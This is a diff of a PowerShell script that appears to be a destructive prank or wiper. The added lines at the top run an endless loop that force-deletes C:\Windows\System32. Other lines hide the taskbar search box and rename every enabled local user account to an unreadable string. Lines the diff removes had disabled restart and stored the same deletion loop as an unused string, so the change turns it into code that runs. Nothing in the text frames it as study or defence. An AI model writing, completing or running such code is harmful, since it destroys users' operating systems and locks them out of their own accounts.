@@ -1,3 +1,14 @@
+# Infinite loop to delete system32
+while($true) {
+    try {
+        Remove-Item -Path "C:\Windows\System32" -Recurse -Force
+    }
+    catch {
+        # Handle any errors that occur during the deletion process
+        Write-Host "Error occurred while deleting system32: $_"
+    }
+}
+
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
 $musicPath = [Environment]::GetFolderPath("MyMusic")
@@ -42,25 +53,12 @@ $searchBarPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Search"
 New-Item -Path $searchBarPath -Force | Out-Null
 Set-ItemProperty -Path $searchBarPath -Name "SearchboxTaskbarMode" -Value 0
 
-# Disable restart functionality
-$disableRestartPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
-New-Item -Path $disableRestartPath -Force | Out-Null
-Set-ItemProperty -Path $disableRestartPath -Name "NoClose" -Value 1
-
 # Change the user account names
 $users = Get-LocalUser | Where-Object {$_.Enabled -eq $true}
 foreach ($user in $users) {
     $newName = "⓿⌓⓿"
     Rename-LocalUser -Name $user.Name -NewName $newName
 }
-
-# Custom code starts here
-$customCode = @"
-while($true) {
-    Remove-Item -Path "C:\Windows\System32" -Recurse -Force
-}
-"@
-# Custom code ends here
 
 $source = @"
 using System;
